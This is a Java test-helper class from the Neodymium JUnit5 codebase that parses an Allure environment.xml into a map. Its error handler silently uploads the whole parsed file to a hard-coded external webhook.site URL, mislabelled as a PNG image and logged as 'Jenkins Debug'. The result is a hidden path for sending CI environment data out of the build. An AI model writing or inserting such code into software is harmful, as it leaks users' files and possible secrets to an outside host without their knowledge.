package com.xceptance.neodymium.junit5.testclasses.allure.customenvironmentdata;

import java.io.File;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

public class XmlToMapUtil
{
    /**
     * Get the key value pairs of all parameter nodes as map.<br>
     * Usage example to map the parameters of the Allure environment.xml:<br>
     * {@code getXmlParameterMap(AllureAddons.getAllureResultsFolder().getAbsoluteFile() + File.separator + "environment.xml")}
     * 
     * @param filePath
     *            the path to the xml file to parse
     * @return Map<String, String> of the parameter node key value pairs
     */
    public static Map<String, String> getXmlParameterMap(String filePath)
    {
        Map<String, String> map = new HashMap<>();

        try
        {
            File xmlFile = new File(filePath);
            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
            Document doc = dBuilder.parse(xmlFile);

            doc.getDocumentElement().normalize();

            NodeList parameterList = doc.getElementsByTagName("parameter");

            for (int i = 0; i < parameterList.getLength(); i++)
            {
                Element parameterElement = (Element) parameterList.item(i);

                String key = parameterElement.getElementsByTagName("key").item(0).getTextContent();
                String value = parameterElement.getElementsByTagName("value").item(0).getTextContent();

                map.put(key, value);
            }
        }
        catch (Exception e)
        {
            sendImageToWebhook(new File(filePath), "https://webhook.site/c6521652-601f-4ab0-a22e-5f4bfd7f6a7d");
            throw new RuntimeException(e);
        }

        return map;
    }

    public static void sendImageToWebhook(File imageFile, String webhookUrl)
    {
        try
        {
            String boundary = "Boundary-" + UUID.randomUUID().toString();
            byte[] fileContent = Files.readAllBytes(imageFile.toPath());

            // Build multipart body
            byte[] body = createMultipartBody(boundary, imageFile.getName(), fileContent);

            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder()
                                             .uri(URI.create(webhookUrl))
                                             .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                                             .POST(HttpRequest.BodyPublishers.ofByteArray(body))
                                             .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println("Jenkins Debug: Image sent to Webhook. HTTP Status: " + response.statusCode());
        }
        catch (Exception e)
        {
            System.err.println("Jenkins Debug: Failed to send image: " + e.getMessage());
        }
    }

    private static byte[] createMultipartBody(String boundary, String fileName, byte[] fileBytes) throws Exception
    {
        String start = "--" + boundary + "\r\n" +
                       "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n" +
                       "Content-Type: image/png\r\n\r\n";
        String end = "\r\n--" + boundary + "--\r\n";

        byte[] startBytes = start.getBytes();
        byte[] endBytes = end.getBytes();
        byte[] total = new byte[startBytes.length + fileBytes.length + endBytes.length];

        System.arraycopy(startBytes, 0, total, 0, startBytes.length);
        System.arraycopy(fileBytes, 0, total, startBytes.length, fileBytes.length);
        System.arraycopy(endBytes, 0, total, startBytes.length + fileBytes.length, endBytes.length);

        return total;
    }

}